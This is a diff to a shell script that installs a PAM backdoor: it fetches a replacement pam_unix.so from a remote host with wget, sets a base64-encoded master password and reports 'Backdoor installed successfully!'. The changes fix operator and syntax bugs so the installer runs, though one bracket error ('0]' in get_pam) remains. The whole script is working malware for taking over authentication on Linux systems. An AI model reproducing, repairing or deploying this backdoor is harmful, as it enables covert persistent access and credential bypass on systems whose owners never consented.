@@ -13,7 +13,7 @@ fi
 
 make_backup () {
     cp ${1} ${1}.bak
-    if [ ${?} -nq 0 ]; then
+    if [ ${?} -ne 0 ]; then
         echo "Failed making backup of pam_unix.so!"
         exit
     fi
@@ -31,7 +31,7 @@ find_pam () {
 
 get_pam () {
     wget "${HOST}${1}" -O ${pam}
-    if [ ${?} -nq 0]; then
+    if [ ${?} -ne 0]; then
         echo "Failed to install pam_unix.so!"
         exit
     fi
@@ -48,7 +48,7 @@ md5_sum () {
 }
 
 set_password () {
-	b64="$(printf %-32.32s ${$1} | base64)"
+	b64="$(printf %-32.32s ${1} | base64)"
 	if [ -z ${b64} ]; then
 		echo "Failed to base64 encode password!"
 		exit
@@ -85,7 +85,7 @@ main () {
     echo "Backdoor installed successfully!"
 }
 
-if [ $# -eq 0]; then
+if [ $# -eq 0 ]; then
 	echo "No password supplied, using default."
 	main
 else
